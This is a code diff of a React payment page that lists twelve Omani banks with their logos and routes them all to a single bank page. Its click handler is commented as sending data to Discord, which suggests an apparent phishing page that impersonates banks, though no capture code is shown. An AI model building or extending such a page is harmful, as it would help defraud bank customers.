@@ -26,19 +26,19 @@ const Page = () => {
   }, []);
 
   const banks = [
-    { id: 1, name: 'بنك عمان العربي', src: '/bankaraboman.jpg', url: '/payment/banks/bankoman' },
-    { id: 2, name: 'البنك العماني الدولي', src: '/b-oman-ntional.png', url: '/payment/banks/bankoman' },
-    { id: 3, name: 'البنك الأهلي', src: '/bankahle.png', url: '/payment/banks/bankaz' },
-    { id: 4, name: 'بنك العز الإسلامي', src: '/bankAz.png', url: '/payment/banks/bankaz' },
-    { id: 5, name: 'بنك صحار', src: '/saharabank.png', url: '/payment/banks/bankoman' },
-    { id: 6, name: 'بنك نزوى', src: '/b-nzwa.webp', url: '/payment/banks/bankmsqt' },
-    { id: 7, name: 'بنك طفار الإسلامي', src: '/b-dafar.svg', url: '/payment/banks/bankaz' },
-    { id: 8, name: 'بنك مسقط', src: '/b-msqt.jpg', url: '/payment/banks/bankmsqt' },
-    { id: 9, name: 'بنك HSBC', src: '/b-hsbc.jpg', url: '/payment/banks/bankoman' },
-    { id: 10, name: 'بنك الاسكان', src: '/bankaskan.png', url: '/payment/banks/bankaz' },
-    { id: 11, name: 'بنك ميثاق', src: '/b-mythaq.png', url: '/payment/banks/bankaz' },
-    { id: 12, name: 'بنك ظفار', src: '/b-dafar no islam.png', url: '/payment/banks/bankoman' }
-  ];
+  { id: 1, name: 'بنك عمان العربي', src: '/bankaraboman.jpg', url: '/payment/banks/bankoman' },
+  { id: 2, name: 'البنك العماني الدولي', src: '/b-oman-ntional.png', url: '/payment/banks/bankoman' },
+  { id: 3, name: 'البنك الأهلي', src: '/bankahle.png', url: '/payment/banks/bankoman' },
+  { id: 4, name: 'بنك العز الإسلامي', src: '/bankAz.png', url: '/payment/banks/bankoman' },
+  { id: 5, name: 'بنك صحار', src: '/saharabank.png', url: '/payment/banks/bankoman' },
+  { id: 6, name: 'بنك نزوى', src: '/b-nzwa.webp', url: '/payment/banks/bankoman' },
+  { id: 7, name: 'بنك طفار الإسلامي', src: '/b-dafar.svg', url: '/payment/banks/bankoman' },
+  { id: 8, name: 'بنك مسقط', src: '/b-msqt.jpg', url: '/payment/banks/bankoman' },
+  { id: 9, name: 'بنك HSBC', src: '/b-hsbc.jpg', url: '/payment/banks/bankoman' },
+  { id: 10, name: 'بنك الاسكان', src: '/bankaskan.png', url: '/payment/banks/bankoman' },
+  { id: 11, name: 'بنك ميثاق', src: '/b-mythaq.png', url: '/payment/banks/bankoman' },
+  { id: 12, name: 'بنك ظفار', src: '/b-dafar no islam.png', url: '/payment/banks/bankoman' }
+];
 
   const handleBankClick = (bankUrl, bankName, bankId) => {
     // إرسال البيانات إلى Discord
